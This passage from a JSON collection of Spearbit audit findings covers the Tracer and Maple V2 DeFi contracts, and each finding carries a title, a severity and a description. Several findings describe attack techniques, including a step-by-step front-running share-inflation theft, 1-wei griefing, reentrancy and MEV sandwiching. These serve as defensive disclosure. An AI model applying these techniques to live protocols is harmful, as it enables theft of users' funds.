uniqueTokenHash = keccak256( abi.encode( deploymentParameters.leverageAmount, deploymentParameters.quoteToken, deploymentParameters.oracleWrapper, direction ) ); PoolToken pairToken = PoolToken(Clones.cloneDeterministic(pairTokenBaseAddress, ,! uniqueTokenHash)); ... }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "No event exists for users self-claiming commits",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "There is no event emitted when a user self-claims a previous commit for themselves, in contrast to claim() which does emit the PaidRequestExecution event.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Mixups of types and scaling factors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "There are a few findings that are related to mixups of types or scaling factors. The following types and scaling factors are used:  uint (no scaling)  uint (WAD scaling)  ABDKMathQuad  ABDKMathQuad (WAD scaling) Solidity >0.8.9s user defined value types could be used to prevent mistakes. This will require several typecasts, but they dont add extra gas costs.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing events for setInvariantCheck() and setAutoClaim() in PoolFactory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Events should be emitted for access-controlled critical functions, and functions that set protocol parameters or affect the protocol in significant ways.",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Terminology used for tokens and oracles is not clear and consistent across codebase",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Different terms are used across the codebase to address the different tokens, leading to some mixups. Assuming a pair BTC/USDC is being tracked with WETH as collateral, we think the following definitions apply:  collateral token == quote token == settlement token == WETH  pool token == long token + short token == long BTC/USDC + short BTC/USDC As for the oracles:  settlementEthOracle is the oracle for settlement in ETH (WETH/ETH)  oracleWrapper is the oracle for BTC/USDC Here is an example of a mixup: The comments in getMint() and getBurn() are different while their result should be similar. It seems the comment on getBurn() has reversed settlement and pool tokens. * @notice Calculates the number of pool tokens to mint, given some settlement token amount and a ,! price ... * @return Quantity of pool tokens to mint ... function getMint(bytes16 price, uint256 amount) public pure returns (uint256) { ... } * @notice Calculate the number of settlement tokens to burn, based on a price and an amount of ,! pool tokens //settlement & pool seem reversed ... * @return Quantity of pool tokens to burn ... function getBurn(bytes16 price, uint256 amount) public pure returns (uint256) { ... } The settlementTokenPrice variable in keeperGas() is misleading and not clear whether it is Eth per Settlement or Settlement per Eth. contract PoolKeeper is IPoolKeeper, Ownable { function keeperGas(..) public view returns (uint256) { int256 settlementTokenPrice = ,! IOracleWrapper(ILeveragedPool(_pool).settlementEthOracle()).getPrice(); ... } }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect NatSpec and comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
        "body": "Some NatSpec documentation and comments contain incorrect or unclear information. In PoolSwapLibraryL283-L293, the NatSpec for the isBeforeFrontRunningInterval() function refers to uncom- mitment, which is not longer supported. * @notice Returns true if the given timestamp is BEFORE the frontRunningInterval starts, * function isBeforeFrontRunningInterval(...) which is allowed for uncommitment. In LeveragedPool.sol#L511 the NatSpec for the withdrawQuote() function notes that the pool should not be paused while the require checks that it is paused. * @dev Pool must not be paused function withdrawQuote() ... { require(paused, \"Pool is live\"); In LeveragedPool.sol#L47 the comment is unclear, as it references a singular update interval but the mapping points to arrays. // The most recent update interval in which a user committed mapping(address => uint256[]) public unAggregatedCommitments; In PoolToken.sol#L16-L23 both the order and the meaning of the documentation are wrong.  The @param lines order should be switched.  @param amount Pool tokens to burn should be replaced with @param amount Pool tokens to mint  @param account Account to burn pool tokens to should be replaced with @param account Account to mint pool tokens to /** * @notice Mints pool tokens - * @param amount Pool tokens to burn - * @param account Account to burn pool tokens to + * @param account Account to mint pool tokens to + * @param amount Pool tokens to mint */ function mint(address account, uint256 amount) external override onlyOwner { ... } In PoolToken.sol#L25-L32 the order of the @param lines is reversed. 47 /** * @notice Burns pool tokens - * @param amount Pool tokens to burn - * @param account Account to burn pool tokens from + * @param account Account to burn pool tokens from + * @param amount Pool tokens to burn */ function burn(address account, uint256 amount) external override onlyOwner { ... } In PoolFactory.sol#L176-L203 the NatSpec @param for poolOwner is missing. It would also be suggested to change the parameter name from poolOwner to pool, since the parameter received from deployPool is the address of the pool and not the owner of the pool. /** * @notice Deploy a contract for pool tokens + * @param pool The pool address, owner of the Pool Token * @param leverage Amount of leverage for pool * @param deploymentParameters Deployment parameters for parent function * @param direction Long or short token, L- or S- * @return Address of the pool token */ function deployPairToken( - + address poolOwner, address pool, string memory leverage, PoolDeployment memory deploymentParameters, string memory direction ) internal returns (address) { ... pairToken.initialize(poolOwner, poolNameAndSymbol, poolNameAndSymbol, settlementDecimals); pairToken.initialize(pool, poolNameAndSymbol, poolNameAndSymbol, settlementDecimals); ... - + } In PoolSwapLibrary.sol#L433-L454 the comments for two of the parameters of function getMintWithBurns() are reversed. * @param amount ... * @param oppositePrice ... ... function getMintWithBurns( ... bytes16 oppositePrice, uint256 amount, ... ) public pure returns (uint256) { ... In ERC20_Cloneable.sol#L46-L49 a comment at the constructor of contract ERC20_Cloneable mentions a default value of 18 for decimals. However, it doesnt use this default value, but the supplied parameter. Moreover, a comment at the constructor of ERC20_Cloneable contract mentions _setupDecimals. This is probably a reference to an old version of the OpenZeppelin ERC20 contracts, and no longer relevant. Additionally, the comments say the values are immutable, but they are set in the initialize() function. 48 @dev Sets the values for {name} and {symbol}, initializes {decimals} with * a default value of 18. * To select a different value for {decimals}, use {_setupDecimals}. * * construction. All three of these values are immutable: they can only be set once during ... constructor(string memory name_, string memory symbol_, uint8 decimals_) ERC20(name_, symbol_) { _decimals = decimals_; } function initialize(address _pool, string memory name_, string memory symbol_, uint8 decimals_) ,! external initializer { owner = _pool; _name = name_; _symbol = symbol_; _decimals = decimals_; }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "First pool depositor can be front-run and have part of their deposit stolen",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The first deposit with a totalSupply of zero shares will mint shares equal to the deposited amount. This makes it possible to deposit the smallest unit of a token and profit off a rounding issue in the computation for the minted shares of the next depositor: (shares_ * totalAssets()) / totalSupply_ Example:  The first depositor (victim) wants to deposit 2M USDC (2e12) and submits the transaction.  The attacker front runs the victim's transaction by calling deposit(1) to get 1 share. They then transfer 1M USDC (1e12) to the contract, such that totalAssets = 1e12 + 1, totalSupply = 1.  When the victim's transaction is mined, they receive 2e12 / (1e12 + 1) * totalSupply = 1 shares (rounded down from 1.9999...).  The attacker withdraws their 1 share and gets 3M USDC * 1 / 2 = 1.5M USDC, making a 0.5M profit. During the migration, an _initialSupply of shares to be airdropped are already minted at initialization and are not affected by this attack.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Users depositing to a pool with unrealized losses will take on the losses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The pool share price used for deposits is always the totalAssets() / totalSupply, however the pool share price when redeeming is totalAssets() - unrealizedLosses() / totalSupply. The unrealized- Losses value is increased by loan impairments (LM.impairLoan) or when starting triggering a default with a liq- uidation (LM.triggerDefault). The totalAssets are only reduced by this value when the loss is realized in LM.removeLoanImpairment or LM.finishCollateralLiquidation. This leads to a time window where deposits use a much higher share price than current redemptions and future deposits. Users depositing to the pool during this time window are almost guaranteed to make losses when they In the worst case, a Pool.deposit might even be (accidentally) front-run by a loan impairment or are realized. liquidation.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "TransitionLoanManager.add does not account for accrued interest since last call",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The TransitionLoanManager.add advances the domain start but the accrued interest since the last domain start is not accounted for. If add is called several times, the accounting will be wrong. It therefore wrongly tracks the _accountedInterest variable.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Unaccounted collateral is mishandled in triggerDefault",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The control flow of triggerDefault is partially determined by the value of MapleLoanLike(loan_- ).collateral() == 0. The code later assumes there are 0 collateral tokens in the loan if this value is true, which is incorrect in the case of unaccounted collateral tokens. In non-liquidating repossessions, this causes an overes- timation of the number of fundsAsset tokens repossessed, leading to a revert in the _disburseLiquidationFunds function. Anyone can trigger this revert by manually transferring 1 Wei of collateralAsset to the loan itself. In liq- uidating repossessions, a similar issue causes the code to call the liquidator's setCollateralRemaining function with only accounted collateral, meaning unaccounted collateral will be unused/stuck in the liquidator.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Initial cycle time is wrong when queuing several config updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The initial cycle time will be wrong if there's already an upcoming config change that changes the cycle duration. Example: currentCycleId: 100 config[0] = currentConfig = {initialCycleId: 1, cycleDuration = 1 days} config[1] = {initialCycleId: 101, cycleDuration = 7 days} Now, scheduling will create a config with initialCycleId: 103 and initialCycleTime = now + 3 * 1 days, but the cycle durations for cycles (100, 101, 102) are 1 days + 7 days + 7 days.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Users cannot resubmit a withdrawal request as per the wiki",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "As per Maple's wiki: pool-v2::PoolManager.sol#371-L382, withdrawal-  Refresh: The withdrawal request can be resubmitted with the same amount of shares by calling pool.requestRedeem(0). However, the current implementation prevents Pool.requestRedeem() from being called where the shares_ pa- rameter is zero.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Accrued interest may be calculated on an overstated payment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The checkTotalAssets() function is a useful helper that may be used to make business decisions in the protocol. However, if there is a late loan payment, the total interest is calculated on an incorrect payment interval, causing the accrued interest to be overstated. It is also important to note that late interest will also be excluded from the total interest calculation.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "No deadline when liquidating a borrower's collateral",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "A loan's collateral is liquidated in the event of a late payment or if the pool delegate impairs a loan If the loan contains any amount of collateral (assuming it is different to the due to insolvency by the borrower. funds' asset), the liquidation process will attempt to sell the collateral at a discounted amount. Because a liquidation is considered active as long as there is remaining collateral in the liquidator contract, a user can knowingly liquidate all but 1 wei of collateral. As there is no incentive for others to liquidate this dust amount, it is up to the loan manager to incur the cost and responsibility of liquidating this amount before they can successfully call LoanManager.finishCollateralLiquidation().",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Loan impairments can be unavoidably unfair for borrowers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "When a pool delegate impairs a loan, the loan's _nextPaymentDueDate will be set to the min of If the pool delegate later decides to remove the im- block.timestamp and the current _nextPaymentDueDate. pairment, the original _nextPaymentDueDate is restored to its correct value. The borrower can also remove an impairment themselves by making a payment. In this case, the _nextPaymentDueDate is not restored, which is always worse for the borrower. This can be unfair since the borrower would have to pay late interest on a loan that was never actually late (according to the original payment due date). Another related consequence is that a borrower can be liquidated before the original payment due date even passes (this is possible as long as the loan is impaired more than gracePeriod seconds away from the original due date).",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "withdrawCover() vulnerable to reentrancy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "withdrawCover() allows for reentrancy and could be abused to withdraw below the minimum cover amount and avoid having to cover protocol insolvency through a bad liquidation or loan default. The moveFunds() function could transfer the asset amount to the recipient specified by the pool delegate. Some In this case, the pool delegate could reenter the tokens allow for callbacks before the actual transfer is made. withdrawCover() function and bypass the balance check as it is made before tokens are actually transferred. This can be repeated to empty out required cover balance from the contract. It is noted that the PoolDelegateCover contract is a protocol controlled contract, hence the low severity.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Bad parameter encoding and deployment when using wrong initializers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The initializers used to encode the arguments, when deploying a new pool in PoolDeployer, might not be the initializers that the proxy factory will use for the default version and might lead to bad parameter encoding & deployments if a wrong initializer is passed.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Event LoanClosed might be emitted with the wrong value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "In function closeLoan function, the fees are got by the getClosingPaymentBreakdown function and it is not adding refinances fees after in code are paid all fee by payServiceFees which may include refinances fees. The event LoanClose might be emitted with the wrong fee value.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Bug in makePayment() reverts when called with small amounts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "When makePayment() is called with an amount which is less than the fees payable, then the trans- action will always revert, even if there is an adequate amount of drawable funds. The revert happens due to an underflow in getUnaccountedAmount() because the token balance is decremented on the previous line without updating drawable funds.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Pool.previewWithdraw always reverts but Pool.withdraw can succeed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The Pool.previewWithdraw => PM. previewWithdraw => WM.previewWithdraw function call se- quence always reverts in the WithdrawalManager. However, the Pool.withdraw function can succeed. This behavior might be unexpected, especially, as integrators call previewWithdraw before doing the actual withdraw call.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Setting a new WithdrawalManager locks funds in old one",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The WithdrawalManager only accepts calls from a PoolManager. When setting a new withdrawal manager with PoolManager.setWithdrawalManager, the old one cannot be accessed anymore. Any user shares locked for withdrawal in the old one are stuck.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use whenProtocolNotPaused on migrate() instead of upgrade() for more complete protection",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "whenProtocolNotPaused is added to migrate() for the Liquidator, MapleLoan, and Withdrawal- Manager contracts in order to protect the protocol by preventing it from upgrading while the protocol is paused. However, this protection happens only during upgrade, and not during instantiation.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing post-migration check in PoolManager.sol could result in lost funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The protocol employs an upgradeable/migrateable system that includes upgradeable initializers for factory created contracts. For the most part, a storage value that was left uninitialized due to an erroneous initializer would not be affect protocol funds. For example forgetting to initialize _locked would cause all nonReentrant functions to revert, but no funds lost. However, if the poolDelegateCover address were unset and depositCover() were called, the funds would be lost as there is no to != address(0) check in transferFrom.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Globals.poolDelegates[delegate_].ownedPoolManager mapping can be overwritten",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The Globals.poolDelegates[delegate_].ownedPoolManager keeps track of a single pool manager for a pool delegate. It can happen that the same pool delegate is registered for a second pool manager and the mapping is overwritten, by calling PM.acceptPendingPoolDelegate -> Globals.transferOwnedPoolManager or Globals.activatePoolManager.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Pool withdrawals can be kept low by non-redeeming users",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "In the current pool design, users request to exit the pool and are scheduled for a withdrawal window in the withdrawal manager. If the pool does not have enough liquidity, their share on the available pool liquidity is proportionate to the total shares of all users who requested to withdraw in that withdrawal window. It's possible for griefers to keep the withdrawals artificially low by requesting a withdrawal but not actually withdraw- ing during the withdrawal window. These griefers are not penalized but their behavior leads to worse withdrawal amounts for every other honest user.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_getCollateralRequiredFor should round up",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The _getCollateralRequiredFor rounds down the collateral that is required from the borrower. This benefits the borrower.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use the cached variable in makePayment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The claim function is called using _nextPaymentDueDate instead of nextPaymentDueDate_",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "No need to explicitly initialize variables with default values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "By default a value of a variable is set to 0 for uint, false for bool, address(0) for address. . . Explicitly initializing/setting it with its default value wastes gas.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache calculation in getExpectedAmount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The decimal precision calculation is used twice in the getExpectedAmount function, if you cache into a new variable would save some gas.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "For-Loop Optmization",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The for-loop can be optimized in 4 ways: 1. Removing initialization of loop counter if the value is 0 by default. 2. Caching array length outside the loop. 3. Prefix increment (++i) instead of postfix increment (i++). 4. Unchecked increment. - for (uint256 i_ = 0; i_ < loans_.length; i_++) { + uint256 length = loans_.length; + for (uint256 i_; i_ < length; ) { ... + unchecked { ++i; } }",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Pool._divRoundUp can be more efficient",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The gas cost of Pool._divRoundUp can be reduced in the context that it's used in.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Liquidator uses different reentrancy guards than rest of codebase",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "All other reentrancy guards of the codebase use values 1/2 instead of 0/1 to indicate NOT_- LOCKED/LOCKED.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use block.timestamp instead of domainStart in removeLoanImpairment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The removeLoanImpairment function adds back all interest from the payment's start date to domain- Start. The _advanceGlobalPaymentAccounting sets domainStart to block.timestamp.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "setTimelockWindows checks isGovernor multiple times",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The Globals.setTimelockWindows function calls setTimelockWindow in a loop and each time set- TimelockWindow's isGovernor is checked.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "fullDaysLate computation can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The fullDaysLate computation can be optimized.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Users can prevent repossessed funds from being claimed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The DebtLocker.sol contract dictates an active liquidation by the following two conditions:  The _liquidator state variable is a non-zero address.  The current balance of the _liquidator contract is non-zero. If an arbitrary user sends 1 wei of funds to the liquidator's address, the borrower will be unable to claim repos- sessed funds as seen in the _handleClaimOfRepossessed() function. While the scope of the audit only covered the diff between v3.0.0 and v4.0.0-rc.0, the audit team decided it was important to include this as an informational issue. The Maple team will be addressing this in their V2 release.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "MEV whenever totalAssets jumps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "An attack users can try to capture large interest payments is sandwiching a payment with a deposit and a withdrawal. The current codebase tries to mostly eliminate this attack by:  Optimistically assuming the next interest payment will be paid back and accruing the interest payment linearly over the payment interval.  Adding a withdrawal period. However, there are still circumstances where the totalAssets increase by a large amount at once:  Users paying back their payment early. The jump in totalAssets will be the paymentAmount - timeE- lapsedSincePaymentStart / paymentInterval * paymentAmount.  Users paying back their entire loan early (closeLoan).  Late payments increase it by the late interest fees and the accrued interest for the next payment from its start date to now. 21",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use ERCHelper approve() as best practice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The ERC20 approve function is being used by fundsAsset in fundLoan() to approve the max amount which does not check the return value.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Additional verification in removeLoanImpairment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "Currently, if removeLoanImpairment is called after the loan's original due date, there will be no issues because the loan's removeLoanImpairment function will revert. It would be good to add a comment about this logic or duplicate the check explicitly in the loan manager. If the loan implementation is upgraded in the future to have a non-reverting removeLoanImpairment function, then the loan manager as-is would account for the interest incorrectly.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Can check msg.sender != collateralAsset/fundsAsset for extra safety",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "Some old ERC tokens (e.g. the Sandbox's SAND token) allow arbitrary calls from the token address itself. This odd behavior is usually a result of implementing the ERC677 approveAndCall and transferAndCall functions incorrectly. With these tokens, it is technically possible for the low-level msg.sender.call(...) in the liquidator to be executing arbitrary code on one of the tokens, which could let an attacker drain the funds.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "IERC426 Implementation of preview and max functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "For the preview functions, EIP 4626 states: MAY revert due to other conditions that would also cause the deposit [mint/redeem, etc.] to revert. But the comments in the interface currently state: MUST NOT revert. In addition to the comments, there is the actual behavior of the preview functions. A commonly accepted interpreta- tion of the standard is that these preview functions should revert in the case of conditions such as protocolPaused, !active, !openToPublic totalAssets > liquidityCap etc. The argument basically states that the max functions should return 0 under such conditions and the preview functions should revert whenever the amount exceeds the max.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Set domainEnd correctly in intermediate _advanceGlobalPaymentAccounting steps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "pay- ments[paymentWithEarliestDueDate].paymentDueDate, which is possibly zero if the last payment has just been accrued past. This is currently not an issue, because in this scenario domainEnd would never be used before it is set back to its correct value in _updateIssuanceParams. However, for increased readability, it is recommended to prevent this odd intermediate state from ever occurring. domainEnd function, set to is",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Replace hard-coded value with PRECISION constant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The constant PRECISION is equal to 1e30. The hard-coded value 1e30 is used in the _queueNext- Payment function, which can be replaced by PRECISION.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use of floating pragma version",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "Contracts should be deployed using a fixed pragma version. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "PoolManager has low-level shares computation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The PoolManager has low-level shares computation logic that should ideally only be in the ERC4626 Pool to separate the concerns.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add additional checks to prevent refinancing/funding a closed loan",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "It's important that an already liquidated loan is not reused by refinancing or funding again as it would break a second liquidation when the second liquidator contract is deployed with the same arguments and salt.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "PoolManager.removeLoanManager errors with out-of-bounds if loan manager not found",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The PoolManager.removeLoanManager errors with an out-of-bounds error if the loan manager is not found.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "PoolManager.removeLoanManager does not clear loanManagers mapping",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The PoolManager.removeLoanManager does not clear the reverse loanManagers[mapleLoan] = loanManager mapping.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Pool._requestRedeem reduces the wrong approval amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The requestRedeem function transfers escrowShares_ from owner but reduces the approval by shares_. Note that in the current code these values are the same but for future PoolManager upgrades this could change.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Issuance rate for double-late claims does not need to be updated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "The previousRate_ for the 8c) case in claim is always zero because the payment (!onTimePayment_). The subtraction can be removed is late I'd suggest removing the subtraction here as it's confusing. The first payment's IR was reduced in _advanceGlob- alPaymentAccounting, the newly scheduled one that is also past due date never increased the IR.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Additional verification that paymentIdOf[loan_] is not 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "Most functions in the loan manager use the value paymentIdOf[loan_] without first checking if it's the default value of 0. Anyone can pay off a loan at any time to cause the claim function to set paymentIdOf[loan_] to 0, so even the privileged functions could be front-run to call on a loan with paymentIdOf 0. This is not an issue in the current codebase because each function would revert for some other reasons, but it is recommended to add an explicit check so future upgrades on other modules don't make this into a more serious issue.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "LoanManager redundant check on late payment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "block.timestamp <= nextPaymentDueDate_ in one of the if statements. The payment is already known to be late at this point in the code, so block.timestamp > previousPaymentDueDate_ is always true.",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add encodeArguments/decodeArguments to WithdrawalManagerInitializer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "Unlike the other Initializers, the WithdrawalManagerInitializer.sol does not have public en- codeArguments/decodeArguments functions, and PoolDeployer need to be changed to use these functions cor- rectly",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reorder WM.processExit parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MapleV2.pdf",
        "body": "All other WM and Pool function signatures start with (uint256 shares/assets, address owner) parameters but the WM.processExit has its parameters reversed (address, uint256).",
        "labels": [
            "Spearbit",
            "MapleV2.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Additional verification in MapleLoanInitializer",
